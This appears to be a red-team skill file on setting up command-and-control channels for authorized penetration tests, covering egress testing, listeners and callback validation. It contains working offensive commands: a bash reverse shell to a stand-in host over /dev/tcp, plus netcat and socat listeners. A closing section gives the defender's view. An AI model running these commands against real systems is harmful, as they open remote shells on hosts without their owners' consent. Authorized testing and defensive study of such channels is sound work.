---
name: c2-channel-setup
description: Use when you need to establish command and control
  communication with a compromised host on an authorized engagement.
  Covers channel protocol choices, listener setup, payload generation
  basics, and validating the channel end to end. Use when the engagement
  requires post-exploitation command execution, when testing egress
  filtering with callbacks, or when setting up the lab infrastructure for
  C2 technique practice.
version: 1.0.0
domain: c2
lifecycle: stable
last_verified: 2026-10-23
parent: c2-fundamentals
requires: [c2-fundamentals]
extends: []
relates: [network-pivoting]
tools:
  - name: Python
    version: 3.12
  - name: OpenSSH
    version: 9.6
  - name: socat
    version: 1.7
---

A command and control channel is the line back to a compromised host:
how you send commands and receive results. This skill covers setting up
basic C2 channels on authorized engagements and in labs: choosing the
protocol, standing up the listener, generating the callback payload, and
proving the channel works. It stays at the fundamentals level; operational
C2 tradecraft is c2-opsec, and payload delivery is c2-payload-staging.

## Quick Workflow

1. Confirm the engagement authorizes C2 callbacks to your infrastructure.
2. Choose the channel protocol based on the target's egress rules.
3. Set up the listener on your infrastructure with logging.
4. Generate the callback payload for the target platform.
5. Deliver the payload through the approved vector.
6. Validate the channel: run a benign command and confirm the output.
7. Log every session with timestamps for the report.

## 1. Choosing the channel

```bash
# Decision guide:
# HTTPS (443): blends with web traffic, best default when egress is open
# DNS: works when only DNS egress exists, slow, for short commands
# Plain TCP: fine in labs, too obvious in production tests

# Test egress from the target's network position first
# (from a foothold or the approved vantage point)
curl -s -o /dev/null -w 'https: %{http_code}\n' https://your-infra.example/
nslookup test.your-infra.example
timeout 3 bash -c '</dev/tcp/your-infra.example/443' && echo "tcp 443 open"
```

Match the channel to the egress you measured, not the egress you assume.
A callback that cannot leave the network is a failed test, not a quiet
one.

## 2. Listener setup

```bash
# Simple HTTPS listener concept with Python (lab use)
# Production engagements use established frameworks; the principle is:
# - TLS with a valid-looking certificate
# - Logging of every session event
# - Authentication so only your payloads connect

# Netcat listener for plain-TCP lab callbacks
nc -lvnp 4444 2>&1 | tee /tmp/c2_sessions.log

# Socat with TLS for a slightly more realistic lab listener
socat OPENSSL-LISTEN:4433,cert=/tmp/lab.pem,verify=0,fork -
```

Log everything: connection times, source IPs, commands sent. The session
log is both your operational record and the report's evidence.

## 3. Payload generation and validation

```bash
# Reverse shell payloads are the simplest channel test (lab/approved only)
# Linux:
bash -i >& /dev/tcp/your-infra.example/443 0>&1
# PowerShell equivalent on Windows targets (obfuscated in real use)

# Validate the channel with harmless commands only at first
# whoami ; hostname ; echo channel-ok

# Then confirm output returns correctly for longer outputs
# (paging, encoding, and timeouts all break naive channels)
```

Generate payloads for the exact target platform and test them in a lab
replica first. A payload that crashes the target process on a production
host is an availability incident; lab validation is not optional.

## Edge cases

- Egress filtering blocks your channel. Fall back through the protocol
  list (HTTPS, DNS, ICMP) based on the egress test, or accept that C2 is
  not possible from this position.
- The callback works but dies quickly. Session persistence is a separate
  problem; note the channel works and address stability in the op plan.
- TLS interception breaks your listener cert. Use a proper certificate
  chain or tunnel inside an allowed protocol.
- Multiple targets need multiple channels. Separate listeners per target
  keep sessions attributable and logs clean.

## Escalation

- The engagement needs a full C2 framework: that is a bigger
  operational decision (infrastructure, profiles, redirectors); raise it
  with the test lead rather than improvising.
- The channel must survive reboots: persistence techniques need separate
  approval on production systems.
- You only need proof of callback, not a working shell: a DNS lookup or
  HTTP hit to your listener proves egress and execution with far less
  risk.

## Detection and defender view

Defenders see C2 as beacons: regular outbound connections to rare
destinations, odd TLS certificates, DNS queries with encoded subdomains,
and processes making network connections they never should. EDR and NDR
flag all of it. Defenses are egress filtering with allow-listing,
TLS inspection, DNS monitoring, and alerting on beacon-like patterns.
The attacker's channel choice is a direct function of what the defender
lets out.

## Key references

- MITRE ATT&CK T1071 (Application Layer Protocol).
- MITRE ATT&CK T1071.001 (Application Layer Protocol: Web Protocols).
- MITRE ATT&CK T1105 (Ingress Tool Transfer).
